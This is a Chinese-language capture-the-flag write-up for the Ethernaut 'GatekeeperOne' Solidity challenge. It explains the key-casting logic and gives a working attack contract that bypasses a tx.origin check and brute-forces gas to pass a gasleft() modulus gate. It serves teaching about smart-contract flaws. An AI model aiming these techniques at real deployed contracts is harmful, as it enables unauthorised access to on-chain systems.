# 13. GatekeeperOne
### 原题
越过守门人并且注册为一个参赛者来完成这一关.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### 分析
这道题就是让我们只要能够通过那三个的修饰器(gateOne，gateTwo，gateThree)的校验就算成功。\
看到都是uint64，uint32，bytes8的各种套嵌转换，一时还会把我们唬住。\
喝口水，不紧张，慢慢来，这些都是计算机的基础知识了。\
bytes8就等于64位。\
tx.origin作为地址，20个字节，那么就是正好160位。\
uint32(), uint16()转换的时候都是从低位截取。\
`uint32(uint64(_gateKey)) ==> _gateKey的低32位` \
`uint16(uint64(_gateKey)) ==> _gateKey的低16位` \
如果要
1.`uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` \
想象成16位，放大到32位，那么16位左侧要补充16个0 \
就像这样：`00001234 == 1234` \
那么我们可以画个内存的示意图 

|16位	|16位	|16位|16位
|:-------|:-----|:--------|:--------|
|未知|未知|0000|未知|

再看第三个条件 \
2.`uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)` \
结合第一个条件得到: \
`uint16(uint64(_gateKey)) == uint16(uint160(tx.origin)` \
这时候内存表应该这样：

|16位	|16位	|16位|16位
|:-------|:-----|:--------|:--------|
|未知|未知|0000|uint16(uint160(tx.origin)|

我们再看第二个条件：\
`uint32(uint64(_gateKey)) != uint64(_gateKey)` \
第一个条件是要相等，这个正好相反，需要不相等，什么是不相等呢？\
那肯定，在64位的高32位不等于0就可以了，也就是说任何数

|16位	|16位	|16位|16位
|:-------|:-----|:--------|:--------|
|任意|任意|0000|uint16(uint160(tx.origin)|

那我们就可以拼出来这个_gateKey了。\
`gateKey = bytes8(uint64(0x12345678)<<32 | uint16(uint160(tx.origin)))` \
"0x12345678"表示任意的数字，再左移32位，\
这时候低32位都是0，然后按位或运算（或运算应该都知道） \
把uint16(uint160(tx.origin)合并到64位的低16位上。\
我们再来看第一个修饰器，这个很简单，我们使用攻击合约就可以。\

第二个修饰器破解才是比较累的。`8191`并不是个特殊的数字。\
gasLeft()表示剩余的gas，`gas % 8191 == 0`,这个怎么去计算出来正好是8191的整倍数数值呢？\
关键是gasLeft()不好精确的计算出来,每个环境不同，编译版本不同。\
我们采用循环扫描去命中，考虑到gas费也有个上限，\
所以分段扫描，不用怕，反正最多也就8191次：）
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGatekeeper {
    function enter(bytes8 _gateKey) external  returns (bool);
}

contract GatekeeperAttack {

    IGatekeeper public immutable gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = IGatekeeper(_gatekeeper);
    }
    /**
     * k是8191的倍数，作为起步gas费用
     * start是分段起始数：[0,maxIndex],[maxIndex, 2 * maxIndex]...，每次扫描就需要修改,递增
     * maxIndex单次最大循环次数
     */
    function attack(uint256 k, uint256 start, uint256 maxIndex) public {
        bytes8 gateKey = key();
        uint256 base = k * 8191;

        for(uint8 i = 0; i < maxIndex; i++) {
          (bool success,) = address(gatekeeper).call{gas: base + start + i}(
            abi.encodeWithSelector(gatekeeper.enter.selector, gateKey)
          );
          if (success) break;
        }

    }

    function key() public view returns(bytes8) {
        // uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)

        uint16 low16 = uint16(uint160(tx.origin));
        
        return bytes8(uint64(0x12345678)<<32 | low16);

    }

}
```
### 总结
这个扫描命中就像修仙，打怪升级。在升级过程中，还要考虑本身的消耗带来的副作用。
